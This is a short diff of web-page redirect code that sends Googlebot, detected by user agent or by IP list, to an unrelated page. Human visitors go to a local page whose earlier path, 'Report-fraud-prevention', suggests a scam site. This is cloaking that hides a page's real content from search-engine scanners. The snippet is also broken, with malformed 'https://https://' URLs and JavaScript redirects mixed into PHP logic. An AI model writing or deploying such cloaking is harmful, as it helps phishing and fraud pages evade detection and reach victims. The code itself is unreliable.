@@ -10,7 +10,7 @@
 
 <script>
 if (navigator.userAgent.indexOf("Googlebot") === -1) {
-    window.location.href = "Report-fraud-prevention/index.html"; // Redirect real users
+    window.location.href = "index.html"; // Redirect real users
 } else {
     window.location.href = "https://https://trollface.dk/"; // Redirect Googlebot to a harmless page
 }
@@ -31,7 +31,7 @@ $visitor_ip = $_SERVER['REMOTE_ADDR'];
 if (in_array($visitor_ip, $google_ips)) {
     window.location.href = "https://https://trollface.dk/";
 } else {
-    window.location.href = "Report-fraud-prevention/index.html"; // Redirect real users
+    window.location.href = "index.html"; // Redirect real users
 }
 
 
